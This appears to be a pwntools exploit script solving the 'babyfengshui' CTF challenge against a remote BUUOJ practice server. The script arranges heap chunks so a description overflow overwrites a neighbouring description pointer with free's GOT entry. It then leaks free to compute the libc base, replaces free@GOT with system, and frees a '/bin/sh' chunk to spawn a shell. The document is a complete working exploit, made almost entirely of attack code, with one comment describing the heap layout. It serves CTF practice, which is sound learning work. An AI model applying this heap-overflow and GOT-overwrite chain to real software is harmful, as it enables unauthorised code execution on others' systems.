from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 25140)
elf = ELF('../babyfengshui_33c3_2016')
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-i386/libc-2.23.so')

free_got = elf.got['free']
# puts("0: Add a user")
# puts("1: Delete a user")
# puts("2: Display a user")
# puts("3: Update a user description")

def add(size, name, desc_size, desc):
  target.sendlineafter('Action: ', '0')
  target.sendlineafter('size of description: ', str(size))
  target.sendlineafter('name: ', name)
  target.sendlineafter('text length: ', str(desc_size))
  target.sendlineafter('text: ', desc)


def delete(index):
  target.sendlineafter('Action: ', '1')
  target.sendlineafter('index: ', str(index))


def display(index):
  target.sendlineafter('Action: ', '2')
  target.sendlineafter('index: ', str(index))

def update(index, desc_size, desc):
  target.sendlineafter('Action: ', '3')
  target.sendlineafter('index: ', str(index))
  target.sendlineafter('text length: ', str(desc_size))
  target.sendlineafter('text: ', desc)


add(0x80, 'aaaa', 0x80, '1111')
add(0x80, 'bbbb', 0x80, '2222')
add(0x8, '/bin/sh\x00', 0x8, '/bin/sh\x00')
delete(0)
add(0x100, 'aaaa', 0x19c, b'a' * 0x198 + p32(free_got))

'''
Layout after re-allocation:
node 0 desc -> node 1 desc -> node 1 struct -> node 2 desc -> node 2 struct -> node 0 struct

We can overflow node 0 to node 1's desc pointer, and let the pointer point to some got address.
'''
display(1)
free_addr = u32(target.recvuntil(b'\xf7')[-4:])
libc.address = free_addr - libc.sym['free']
system = libc.sym['system']

# Modify free's got.
update(1, 0x4, p32(system))
delete(2)
target.interactive()

